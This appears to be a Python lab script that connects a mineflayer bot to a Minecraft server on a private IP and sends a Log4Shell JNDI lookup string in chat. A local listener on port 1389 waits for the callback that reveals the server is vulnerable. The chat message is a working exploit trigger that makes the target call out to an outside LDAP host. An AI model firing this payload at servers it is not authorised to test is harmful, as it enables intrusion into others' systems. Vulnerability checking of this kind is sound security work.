from javascript import require, On
import socket
import threading
import time

# Import the javascript libraries
mineflayer = require("mineflayer")

# Global bot parameters
server_host = "192.168.57.131"
server_port = 25565
reconnect = True

# Port listener parameters
listener_port = 1389
listener_host = "0.0.0.0"
connection_made = False

# Create a TCP listener
def start_listener():
    global connection_made
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind((listener_host, listener_port))
    listener.listen(1)
    print(f"Listening on port {listener_port}...")

    try:
        listener.settimeout(10)  # Set a timeout for the listener (10 seconds)
        conn, addr = listener.accept()  # Accepts a connection
        connection_made = True
        print(f"Connection received from {addr}")
        print(f"VULNERABLE TO LOG4SHELL!!!!!")
        conn.close()
    except socket.timeout:
        print("No connection received on port 1389.")
    finally:
        listener.close()

# Define the bot class
class MCBot:

    def __init__(self, bot_name):
        self.bot_args = {
            "host": server_host,
            "port": server_port,
            "username": bot_name,
            "hideErrors": False,
        }
        self.reconnect = reconnect
        self.bot_name = bot_name
        self.start_bot()

    # Tags bot username before console messages
    def log(self, message):
        print(f"[{self.bot.username}] {message}")

    # Start mineflayer bot
    def start_bot(self):
        # Start the listener in a separate thread
        listener_thread = threading.Thread(target=start_listener)
        listener_thread.start()

        # Wait briefly to ensure listener is ready
        time.sleep(1)

        # Start the bot
        self.bot = mineflayer.createBot(self.bot_args)
        self.start_events()

        # Wait for the listener to finish
        listener_thread.join()

        # Print whether a connection was made on port 1389
        if connection_made:
            print("A connection was made on port 1389.")
        else:
            print("No connection was made on port 1389.")

    # Attach mineflayer events to bot
    def start_events(self):

        # Login event: Triggers on bot login
        @On(self.bot, "login")
        def login(this):
            # Displays which server you are currently connected to
            self.bot_socket = self.bot._client.socket
            self.log(
                f"Logged in to {server_host}:{server_port}"
            )

        # Spawn event: Triggers on bot entity spawn
        @On(self.bot, "spawn")
        def spawn(this):
            # Send the message
            self.bot.chat("${jndi"+":ldap://192.168.57.130:1389/a}")
            
            # Disconnect immediately after sending the message
            self.bot.end()

bot = MCBot("sss")
